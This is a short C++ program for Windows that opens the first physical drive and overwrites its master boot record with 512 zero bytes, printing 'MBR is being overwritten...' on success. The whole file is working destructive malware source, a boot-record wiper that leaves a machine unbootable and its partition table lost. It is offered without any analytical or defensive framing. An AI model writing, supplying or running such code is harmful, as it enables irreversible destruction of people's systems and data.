#include <iostream>
#include <Windows.h>

using std::cout;
using std::endl;

#define MBR_SIZE 512

int main() {
	DWORD dueWrite;
	char mbrData[512];
	SecureZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE hMBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (WriteFile(hMBR, mbrData, MBR_SIZE, &dueWrite, NULL)) {
		cout << "MBR is being overwritten...\n";
	}

	else {
		cout << "Are you running program with admin privileges?\n";
	}
	CloseHandle(hMBR);


	return 0;
}